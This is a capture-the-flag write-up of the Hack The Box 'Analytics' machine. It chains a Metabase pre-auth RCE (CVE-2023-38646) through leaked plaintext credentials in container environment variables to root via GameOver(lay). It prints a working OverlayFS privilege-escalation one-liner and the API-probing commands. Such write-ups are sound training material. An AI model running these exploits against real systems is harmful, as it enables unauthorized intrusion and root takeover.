# HTB: Analytics — Writeup

**OS:** Linux
**Difficulty:** Easy
**Techniques:** Metabase pre-auth RCE (CVE-2023-38646), Docker env-var creds, GameOver(lay) OverlayFS privesc (CVE-2023-2640)

---

## Synopsis

Analytics is an Easy Linux machine running a [Metabase](https://www.metabase.com/) business-intelligence application on a `data.` virtual host. The Metabase version (0.46.6) is vulnerable to CVE-2023-38646, a pre-authentication remote code execution flaw: an unauthenticated API endpoint leaks the installation `setup-token`, which allows abuse of the H2 database "validation" logic to execute operating-system commands. This yields a shell inside a Docker container, where a real user's credentials are exposed in environment variables and reused to SSH to the host. The host runs an Ubuntu 22.04 kernel vulnerable to GameOver(lay) (CVE-2023-2640 / CVE-2023-32629), an OverlayFS local privilege escalation that is used to obtain root.

## Skills Required

- Basic web and virtual-host enumeration
- Reading an application's exposed API to fingerprint its version
- Understanding of containers vs. host
- Matching a kernel/OS version to a known local privesc

## Skills Learned

- Exploiting Metabase pre-auth RCE via a leaked setup-token (CVE-2023-38646)
- Harvesting credentials from container environment variables and pivoting to the host over SSH
- Identifying and exploiting the GameOver(lay) OverlayFS local privilege escalation (CVE-2023-2640)

---

## Enumeration

### Nmap

```
$ nmap -p- --min-rate 5000 -oA nmap/Analytics-allports 10.129.229.224
$ nmap -p22,80 -sCV -oA nmap/Analytics 10.129.229.224

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
```

Only SSH and HTTP are open. Port 80 redirects to the hostname `analytical.htb`, which is added to `/etc/hosts`:

```
$ echo "10.129.229.224 analytical.htb" | sudo tee -a /etc/hosts
```

### HTTP (80) — finding the Metabase vhost

`http://analytical.htb` serves a data-analytics marketing site. The site's **Login** link points at a second hostname, `data.analytical.htb`, which is added to `/etc/hosts` as well. That vhost serves a **Metabase** sign-in page.

![Metabase sign-in page served on data.analytical.htb](images/analytics_metabase-login-page.png)

Rather than attack the login, the first job against off-the-shelf software is to fingerprint the exact version. Metabase exposes an **unauthenticated** properties endpoint that returns a large JSON blob including the version — and, critically, the installation setup token:

```
$ curl -s http://data.analytical.htb/api/session/properties | grep -o '"version":{[^}]*}'
... "tag":"v0.46.6" ...

$ curl -s http://data.analytical.htb/api/session/properties | grep -o '"setup-token":"[^"]*"'
"setup-token":"<redacted>"
```

Metabase **0.46.6** is vulnerable to [CVE-2023-38646](https://www.sentinelone.com/vulnerability-database/cve-2023-38646/).

---

## Foothold

### CVE-2023-38646 — Metabase pre-auth RCE

Metabase's first-run setup endpoint (`/api/setup/validate`) is meant to be reachable only by the legitimate installer, who proves their identity with a `setup-token`. In vulnerable versions that token is leaked by the unauthenticated `/api/session/properties` endpoint above. With the token, an attacker can reach the database-connection "validation" code. Metabase bundles the **H2** database engine, whose JDBC connection string accepts an `INIT=` clause that runs arbitrary SQL — and H2 allows that SQL to define a Java function that shells out to the operating system. The result is that a crafted "test this H2 connection" request runs attacker-supplied OS commands **before authentication**.

A listener was started and the exploit (run via the Metasploit module `exploit/linux/http/metabase_setup_token_rce`, which automates fetching the token and sending the H2 payload) returned a shell:

```
meterpreter > getuid
Server username: metabase
meterpreter > shell
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase)
hostname
<container-id>
```

The shell lands **inside a Docker container**, not on the host — the filesystem is minimal and there are no normal user accounts.

### Credentials in container environment variables

Containers are frequently configured through environment variables, and this one stores a real user's credentials in the clear:

```
env
...
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_DB_FILE=//metabase.db/metabase.db
...
```

Port 22 (SSH) is exposed on the **host**, and the credentials are reused there:

```
$ ssh metalytics@analytical.htb
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```

`user.txt` retrieved. `metalytics` has no `sudo` rights.

---

## Privilege Escalation

### GameOver(lay) — OverlayFS local privesc (CVE-2023-2640 / CVE-2023-32629)

With no sudo access, the route to root is a kernel-level vulnerability, so the host is fingerprinted:

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux
metalytics@analytics:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
```

Ubuntu 22.04.3 with kernel `6.2.0-25-generic` falls in the range affected by **GameOver(lay)** (CVE-2023-2640 and CVE-2023-32629). These are Ubuntu-specific flaws in **OverlayFS**: an unprivileged user can mount an overlay filesystem such that extended file **capabilities** (e.g. `cap_setuid`) are improperly carried onto a file in the upper layer. Executing a crafted binary that gains those capabilities yields code execution as root. The public proof-of-concept is a compact shell one-liner that mounts the overlay, drops a capability-bearing payload, and executes it.

The public PoC is the following one-liner, run as `metalytics`. It uses `unshare -rm` to enter a new user+mount namespace (where the unprivileged user is "root"), copies `python3` into a lower dir and sets the `cap_setuid` capability on it, then mounts an overlay so the capability is carried onto the file in the upper layer. The copied `python3` then calls `setuid(0)` and runs a command as real root:

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
uid=0(root) gid=0(root) groups=0(root)
```

To get a full root shell rather than a single `id`, the trailing `id` in the `os.system(...)` call is swapped for `bash`:

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
```

> ℹ️ The first run failed with `mount: bad usage` because of a stray space in the mount options (`-o rw, lowerdir=...`). Removing the space so the options are one unbroken comma-separated list (`-o rw,lowerdir=l,upperdir=u,workdir=w`) made the mount succeed and dropped the root shell.

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Nmap; port 80 redirect → `analytical.htb`; Login link → `data.analytical.htb` Metabase vhost; version via `/api/session/properties` |
| Foothold | CVE-2023-38646 Metabase pre-auth RCE (leaked setup-token → H2 `INIT` command execution) → shell in Docker container |
| Lateral Movement | `metalytics` credentials in container env vars reused for SSH to the host |
| Privilege Escalation | GameOver(lay) OverlayFS local privesc (CVE-2023-2640 / CVE-2023-32629) → root |

---

## Lessons / Takeaways

- **An app's own unauthenticated API often leaks more than its version.** `/api/session/properties` handed over both the Metabase version *and* the setup-token that makes the RCE possible — read exposed endpoints fully before attacking a login.
- **A shell in a container is a starting point, not the goal.** The sparse filesystem is a signal to look at how the container was configured — environment variables are a classic home for reused credentials.
- **No sudo ≠ no privesc.** When sudo and misconfigurations come up empty, fingerprint the kernel/OS: `uname -a` + `/etc/os-release` pointed straight at a known 2023 Ubuntu local privesc.
- **Read exploit code before running it.** The GameOver(lay) one-liner is short enough to understand fully (overlay mount + capability trick), which also made the "couple of hiccups" easy to diagnose rather than guess at.
